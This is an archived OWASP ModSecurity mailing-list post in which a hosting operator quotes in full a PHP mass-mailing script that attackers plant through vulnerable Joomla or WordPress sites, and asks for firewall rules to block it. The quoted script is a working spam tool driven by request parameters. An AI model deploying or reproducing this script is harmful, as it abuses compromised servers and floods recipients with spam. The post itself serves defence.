<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Prevent Spam Mail
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Prevent%20Spam%20Mail&In-Reply-To=%3C3C9B30B429EE42D494CBF031EC1DE5F0%40UserPC%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001654.html">
   <LINK REL="Next"  HREF="001659.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Prevent Spam Mail</H1>
    <B>Mesra.net CEO</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Prevent%20Spam%20Mail&In-Reply-To=%3C3C9B30B429EE42D494CBF031EC1DE5F0%40UserPC%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Prevent Spam Mail">admin at mesra.my
       </A><BR>
    <I>Thu Sep  4 18:37:46 UTC 2014</I>
    <P><UL>
        <LI>Previous message: <A HREF="001654.html">[Owasp-modsecurity-core-rule-set] Block URL of Joomla
</A></li>
        <LI>Next message: <A HREF="001659.html">[Owasp-modsecurity-core-rule-set] Problem with the Rule
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1658">[ date ]</a>
              <a href="thread.html#1658">[ thread ]</a>
              <a href="subject.html#1658">[ subject ]</a>
              <a href="author.html#1658">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Dear All,

Lately I&#8217;m facing lot of hackers were upload their script via buggy Joomla or Wordpress and run the script to sending thousands of spam mail, the sample of script as below:

---------------------------------------------------------------------------------------------------------------------------------------------
(mail.php)

&lt;?php
ini_set('mail.add_x_header','off');
$_testmail = $_REQUEST['TESTMAIL'];
$_testlink = $_REQUEST['TESTLINK'];
$_status = $_REQUEST['STATUS'];
$_snames = $_REQUEST['SNAMES'];
$_semails = $_REQUEST['SEMAILS'];
$_message = $_REQUEST['MESSAGE'];
$_subjects = $_REQUEST['SUBJECTS'];
$_ctype = $_REQUEST['CTYPE'];
$_spamdom = $_REQUEST['SPAMDOM'];
$_mlr = $_REQUEST['MAILER'];

$_SERVER['PHP_SELF'] = &quot;/email.php&quot;;
$_SERVER['REMOTE_ADDR'] = $_SERVER['SERVER_ADDR'];

$SpamDom = explode(&quot;,&quot;, $_spamdom);
$Snames = explode(&quot;,&quot;, $_snames);
$Semails = explode(&quot;,&quot;, $_semails);
$Subjects = explode(&quot;,&quot;, $_subjects);

$rnx = chr(rand(97,122)) . chr(rand(97,122)) . chr(rand(97,122)) . rand(100,999);
$rnx.= chr(rand(97,122)) . chr(rand(97,122)) . chr(rand(97,122)) . rand(100,999);
$rnx.= &quot;.&quot; . $SpamDom[array_rand($SpamDom)];

$smail = $Semails[array_rand($Semails)];
$_rmessage = str_replace(&quot;XXRANDOMXX&quot;, $rnx, $_message);
$_message = str_replace(&quot;\n&quot;, &quot;\r\n&quot;, $_rmessage);
$_from = $Semails[array_rand($Semails)];
$_subject = $Subjects[array_rand($Subjects)];

$_ctype = stripslashes($_ctype);
$message  = urlencode($_message);
$message  = ereg_replace(&quot;%5C%22&quot;, &quot;%22&quot;, $message);
$message  = urldecode($message);
$_from = stripslashes($_from);
$_message  = stripslashes($message);
$_subject  = stripslashes($_subject);

$headers   = array();
$headers[] = &quot;From: $_from&quot;;
$headers[] = &quot;X-Priority: 3&quot;;
$headers[] = &quot;X-Mailer: $_mlr&quot;;
$headers[] = &quot;MIME-Version: 1.0&quot;;
$headers[] = &quot;Content-type: $_ctype; charset=\&quot;UTF-8\&quot;&quot;;
$headers[] = &quot;Content-Transfer-Encoding: quoted-printable&quot;;

foreach ($headers as $key=&gt;$value) {
        $headers[$key] = stripslashes($value);
}

if($_status == &quot;CHECK&quot;) {
        if($_testmail == NULL) return 0;
        if($_from == NULL) return 0;
        if($_message == NULL) return 0;
        if($_subject == NULL) return 0;

        $_subject = $_subject . &quot; &quot; . $_testlink;

        mail($_testmail, $_subject, $_message, implode(&quot;\r\n&quot;, $headers));
        print &quot;$_testmail\n\n$_message\n\n$_from\n\n$_subject&quot;;
}
elseif($_status == &quot;MASS&quot;) {
        $_maillist = $_REQUEST['MAILLIST'];
        $emails = explode(&quot;,&quot;, $_maillist);

        if($_from == NULL) return 0;
        if($_message == NULL) return 0;
        if($_subject == NULL) return 0;

        foreach($emails as $email) {
                if($email == NULL) $email = $_testmail;
                mail($email, $_subject, $_message, implode(&quot;\r\n&quot;, $headers));
                print &quot;$email - SENT\r\n&quot;;
        }
}
else {
        print &quot;SENDER UP&quot;;
}
?&gt;

------------------------------------------------------------------------------------------------------------------------

Hopefully theres an idea how can I prevent the hackers to run that script by mod security rules.

Please help and Thank you so much



-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<A HREF="http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20140905/1a4aacc0/attachment.html">http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20140905/1a4aacc0/attachment.html</A>&gt;
</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001654.html">[Owasp-modsecurity-core-rule-set] Block URL of Joomla
</A></li>
	<LI>Next message: <A HREF="001659.html">[Owasp-modsecurity-core-rule-set] Problem with the Rule
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1658">[ date ]</a>
              <a href="thread.html#1658">[ thread ]</a>
              <a href="subject.html#1658">[ subject ]</a>
              <a href="author.html#1658">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
